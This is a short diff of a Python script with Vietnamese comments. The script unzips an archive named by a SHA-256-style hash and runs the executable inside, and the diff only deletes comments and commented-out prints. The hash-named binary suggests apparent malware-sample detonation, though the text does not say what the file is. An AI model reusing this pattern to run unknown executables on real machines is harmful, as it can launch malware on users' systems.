@@ -37,13 +37,11 @@ if __name__ == "__main__":
         unzip_file('87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.zip')
         
         # Chạy file EXE bên trong file ZIP
-        # Giả sử file EXE có tên là 'executable.exe'
+        
         exe_name = '87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.exe'  # Thay đổi theo tên thực tế của file EXE
         if os.path.exists(exe_name):
             run_executable(exe_name)
-            # print("aaa")
-        # else:
-        #     print("Không tìm thấy file EXE để chạy.")
+
         
     except (zipfile.BadZipFile, RuntimeError) as e:
         print("Có lỗi xảy ra trong quá trình giải nén:", e)
